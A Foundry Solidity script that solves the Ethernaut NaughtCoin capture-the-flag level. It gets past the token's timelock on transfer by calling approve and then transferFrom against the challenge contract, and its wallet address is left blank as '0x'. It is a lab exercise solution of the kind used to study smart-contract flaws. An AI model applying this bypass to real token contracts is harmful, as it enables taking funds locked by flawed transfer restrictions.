// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/15_NaughtCoin.sol";

contract ExploitScript is Script {

    NaughtCoin level15 = NaughtCoin(payable(0x6a37b3F59c7831dE257f549ccfa685eE90653fAa));
    address wallet = 0x; // wallet address

    function run() external {
        vm.startBroadcast();

        uint256 coin = level15.balanceOf(wallet);
        // console.log(level15.balanceOf(wallet));
        // level15.allowance(wallet, wallet);
        level15.approve(wallet, coin);
        // level15.allowance(wallet, wallet);
        level15.transferFrom(wallet, address(level15), coin);
        // console.log(level15.balanceOf(wallet));
        
        vm.stopBroadcast();
    }
}